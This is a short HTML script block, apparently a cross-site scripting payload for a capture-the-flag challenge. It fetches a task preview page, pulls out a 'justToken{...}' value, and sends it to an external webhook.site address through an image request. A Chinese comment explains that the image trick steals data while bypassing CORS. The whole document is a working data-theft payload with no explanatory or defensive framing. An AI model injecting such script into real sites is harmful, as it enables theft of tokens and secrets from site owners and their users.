<script>
  fetch('/tasks/preview/0/0')
    .then(r => r.text())
    .then(data => {
      const token = data.match(/justToken\{([^}]+)\}/)?.[1];
      if (token) {
        // 用 <img> 偷資料，繞過 CORS
        const i = new Image();
        i.src = 'https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?token=' + token;
      }
    });
</script>
